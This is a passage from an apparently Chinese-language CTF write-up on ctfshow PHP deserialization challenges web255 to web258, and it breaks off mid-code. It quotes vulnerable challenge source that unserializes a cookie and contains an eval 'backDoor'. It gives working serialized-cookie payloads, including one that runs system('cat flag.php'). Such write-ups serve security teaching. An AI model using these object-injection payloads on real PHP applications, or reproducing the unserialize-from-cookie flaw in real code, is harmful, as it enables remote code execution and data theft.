<span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;&#125;</span>因为cookie中将"作为截断符号，所需要编码绕过，这里采用url编码</code></pre><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>**vipOneKeyGetFlag()**方法要求username和password不一样，传入的类是自己可控的，改就行了呗</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:5:"xxxxx";s:5:"isVip";b:1;&#125;</span></code></pre><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>从<code>backDoor</code>的eval函数入手，修改<code>ctfShowUser</code>的class变量触发backDoor类，进行命令执行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("cat flag.php");'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>backDoor<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>cat<span class="token operator">+</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:11:"ctfShowUser":4:&#123;s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:1;s:18:"ctfShowUserclass";O:8:"backDoor":1:&#123;s:14:"backDoorcode";s:23:"system("cat flag.php");";&#125;&#125;</span></code></pre><h4 id="web258-绕过正则"><a href="#web258-绕过正则" class="headerlink" title="web258(+绕过正则)"></a>web258(+绕过正则)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 